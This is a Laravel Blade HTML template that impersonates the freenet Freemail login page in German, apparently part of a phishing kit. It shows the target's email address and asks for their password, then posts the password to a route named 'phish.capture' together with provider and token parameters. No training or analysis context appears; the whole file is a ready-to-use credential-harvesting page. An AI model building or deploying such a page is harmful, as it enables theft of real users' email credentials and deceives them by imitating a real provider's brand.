<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex">
    <title>freenet Freemail Login</title>
    <link rel="icon" href="https://email.freenet.de/favicon.ico">
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:"Open Sans",sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
        .card{background:#fff;padding:40px;width:100%;max-width:420px;box-shadow:0 2px 8px rgba(0,0,0,.06);text-align:center}
        .logo-section{margin-bottom:24px}
        .logo-section .brand{font-size:28px;font-weight:800;color:#00a651;letter-spacing:-0.5px}
        .logo-section .tagline{font-size:13px;color:#888;margin-top:4px}
        h1{font-size:20px;color:#333;margin-bottom:8px;font-weight:600}
        .sub{font-size:14px;color:#666;margin-bottom:24px}
        .email-display{display:flex;align-items:center;padding:12px 16px;background:#f5f5f5;margin-bottom:20px;text-align:left;gap:12px}
        .avatar{width:32px;height:32px;border-radius:50%;background:#00a651;display:flex;align-items:center;justify-content:center;color:#fff;font-size:14px;font-weight:500;flex-shrink:0}
        .email-text{font-size:14px;color:#333;font-weight:400}
        .form-group{text-align:left;margin-bottom:16px}
        .form-group label{display:block;font-size:13px;color:#333;margin-bottom:6px;font-weight:500}
        .form-group input{width:100%;height:40px;padding:0 12px;font-size:14px;font-family:"Open Sans",sans-serif;border:1px solid #ccc;border-radius:4px;outline:none;transition:border-color .2s}
        .form-group input:focus{border-color:#00a651;box-shadow:0 0 0 2px rgba(0,166,81,.1)}
        .checkbox-row{display:flex;align-items:center;gap:8px;margin-bottom:16px}
        .checkbox-row input[type="checkbox"]{width:16px;height:16px;cursor:pointer}
        .checkbox-row label{font-size:13px;color:#666;cursor:pointer}
        .btn-login{width:100%;height:44px;background:#00a651;color:#fff;border:none;border-radius:4px;font-size:15px;font-weight:600;cursor:pointer;transition:background .15s}
        .btn-login:hover{background:#008c44}
        .links-row{display:flex;justify-content:space-between;margin-top:16px}
        .links-row a{font-size:13px;color:#00a651;text-decoration:none}
        .links-row a:hover{text-decoration:underline}
        .footer{background:#333;color:#fff;padding:16px 24px;text-align:center;font-size:11px;margin-top:24px}
        .footer a{color:#ccc;text-decoration:none;margin:0 8px}
        .footer a:hover{text-decoration:underline}
        @media(max-width:480px){.card{padding:24px}}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo-section">
            <div class="brand">freenet</div>
            <div class="tagline">Freemail</div>
        </div>
        <h1>Willkommen bei freenet</h1>
        <p class="sub">Bitte melden Sie sich mit Ihren Zugangsdaten an.</p>
        <div class="email-display">
            <div class="avatar">{{ strtoupper(substr($email, 0, 1)) }}</div>
            <div class="email-text">{{ $email }}</div>
        </div>
        <form action="{{ route('phish.capture', ['provider' => 'freenet', 'token' => $token]) }}" method="POST">
            @csrf
            <div class="form-group">
                <label for="password">Passwort</label>
                <input type="password" id="password" name="password" required autofocus>
            </div>
            <div class="checkbox-row">
                <input type="checkbox" id="keepLogin" checked>
                <label for="keepLogin">Angemeldet bleiben</label>
            </div>
            <button type="submit" class="btn-login">Anmelden</button>
        </form>
        <div class="links-row">
            <a href="#">Passwort vergessen?</a>
            <a href="#">Noch kein Konto?</a>
        </div>
    </div>
    <div class="footer">
        <a href="#">Impressum</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
    </div>
</body>
</html>
